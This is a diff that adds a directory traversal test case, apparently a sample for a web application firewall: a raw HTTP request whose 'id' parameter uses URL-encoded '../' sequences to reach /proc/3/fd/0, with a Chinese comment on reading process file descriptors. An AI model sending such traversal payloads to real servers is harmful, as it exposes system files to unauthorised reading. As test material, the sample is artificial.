@@ -1,0 +1,9 @@
+# 目录遍历_/proc/3/fd/0
+# fd是一个目录，里面包含着当前进程打开的每一个文件的描述符，这些文件描述符是指向实际文件的一个符号连接，即每个通过这个进程打开的文件都会显示在这里。所以可以通过fd目录的文件获取进程，从而打开每个文件的路径以及文件内容。
+GET /?id=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2F3%2Ffd%2F0&bid=hd_tag_m8mv23s7 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23s7
+RM-PRO-Token: ba1b387d7667f5ef33d77c75f3da09af
+RM-PRO-Time: 1742808341191
+User-Agent: curl/7.83.1
+
